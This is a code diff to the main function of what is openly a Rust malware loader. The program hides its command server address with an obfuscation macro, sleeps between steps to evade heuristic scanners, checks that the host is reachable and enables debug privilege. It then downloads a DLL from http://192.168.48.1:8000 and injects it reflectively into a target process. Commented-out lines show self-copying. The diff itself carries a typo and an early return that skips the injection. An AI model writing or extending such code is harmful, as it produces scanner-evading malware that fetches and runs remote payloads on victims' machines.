@@ -1,4 +1,7 @@
 // #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+#![allow(unused)]
+#![allow(unreachable_code)]
+#![allow(unused_unsafe)]
 
 
 mod download;
@@ -43,7 +46,7 @@ struct Args {
 }
 
 
-fn main() {
+fn main() -> Result<(), anyhow::Error>{
     // let args = Args::parse();
 
     // let Some(url) = args.url else {
@@ -54,18 +57,23 @@ fn main() {
     #[cfg(not(debug_assertions))]
     {
         for _i in 1..=3 {
+
+            // Interleaving other behaviors to deceive heuristic scanning
+
             thread::sleep(Duration::from_secs(1));
         }
 
         let obfused_ip = obfuse!("192.168.48.1");
         let ip = obfused_ip.as_str();
         let common_ports = [80, 8000];
+
+
         let online = common_ports.iter().any(|&port| {
-            reconnaissance::is_host_online(ip, port)
+            reconnaissance::check_host_online(ip, port).is_ok()
         });
         
         if !online {
-            return;
+            return OK(());
         }
     }
 
@@ -80,6 +88,16 @@ fn main() {
     }
 
     nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
+
+    if let Err(enabled_debug_privilege) = reconnaissance::enable_debug_privilege()
+    {
+        debug_eprintln!("[WARNING] Enable Debug Priv failed\n{:#}", enabled_debug_privilege);
+    }
+    else {
+        debug_println!("[INFO] Enabled Debug Priv");
+    }
+
+
 
     // let obfused_url = obfuse!("http://192.168.48.1:8000/MCHELP.dll");
     let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
@@ -104,17 +122,16 @@ fn main() {
         debug_println!("[INFO] Downloaded {} bytes", data.len());
     } else {
         debug_println!("[INFO] Downloaded empty file");
-        return;
+        return Ok(());
     }
 
+    return Ok(());
 
     // let dll = pe_parser::new(data);
     let dll = parse_pe::PeFileParser::new(&data);
 
     let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
     debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
-
-    nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
     // let dr0 = hwbp::DR::Dr0;
     // let dr1 = hwbp::DR::Dr1;
@@ -144,7 +161,7 @@ fn main() {
         &process.encode_utf16().collect::<Vec<u16>>(),
         &dll,
         func_raw,
-    ).expect("Failed to DLL!\n");
+    ).expect("Failed to 1nject DLL!\n");
 
     // file::self_copying().expect("[ERROR] self copying failed!");
 
@@ -160,5 +177,6 @@ fn main() {
         thread::sleep(Duration::from_secs(1));
     }
     
+    Ok(())
 
 }
